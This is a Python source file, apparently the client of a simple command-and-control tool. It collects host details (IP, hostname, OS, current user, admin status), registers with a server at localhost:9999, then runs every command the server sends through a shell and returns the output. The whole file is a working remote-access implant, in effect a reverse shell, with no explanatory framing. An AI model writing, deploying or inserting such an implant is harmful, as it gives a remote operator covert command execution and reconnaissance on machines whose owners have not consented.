import socket
import os
import subprocess
import platform
import ctypes

SERVER = 'localhost'
SERVER_PORT = 9999
BUFFER_SIZE = 4096
DEBUG = True

class style():
  RED       = '\033[31m'
  GREEN     = '\033[32m'
  BLUE      = '\033[34m'
  RESET     = '\033[0m'

def is_elevated():
    if os.name == 'nt':  # Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:  # Unix/Linux/macOS
        return os.geteuid() == 0

def get_ip_address():
    try:
        # Gets the actual IP address by connecting to a public IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "Unavailable"

def close_connection(client_sock, msg="no message specified"):
    msg_to_send = f"KILL_R {msg}"
    client_sock.send(msg_to_send.encode())
    client_sock.close()

def main():

    # Gather basic system info
    sys_os = platform.system()
    hostname = socket.gethostname()
    ipaddress = get_ip_address()
    cur_user = os.getlogin()
    elevated = is_elevated()
    sys_info = f"REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"

    # Connect to the server
    client_sock = socket.socket()
    client_sock.connect((SERVER,SERVER_PORT))
    
    try:
        # Send register message to server
        # client_sock.send(b"Hello Server!") # b before makes it bytes (needed for network), or do "a".encode()
        client_sock.send(sys_info.encode())
        response = client_sock.recv(BUFFER_SIZE).decode()
        if not response.startswith("REG_R"):
            raise ValueError

        # Await input from server and execute
        while True:
            try:
                response = client_sock.recv(BUFFER_SIZE).decode()
                if response.startswith("CMD "):
                    # Give it 60 seconds to run before failing
                    command = response[len("CMD "):]
                    # dns_server_lines = subprocess.run(['grep','nameserver'], input=etc_resolve_output, stdout=subprocess.PIPE, text=True).stdout.splitlines()
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
                    # output = result.stdout + result.stderr
                    output = f"CMD_R {result.returncode} | {result.stdout} | {result.stderr}"
                    client_sock.send(output.encode())
                if response.startswith("KILL"):
                    close_connection(client_sock,"server requested kill")
                    exit()
            except ConnectionResetError:
                print(f"Client has lost connection to server")
                client_sock.close()
                exit()

    except Exception as e:
        # Graceful exit before crash
        close_connection(client_sock,e)
        raise e

main()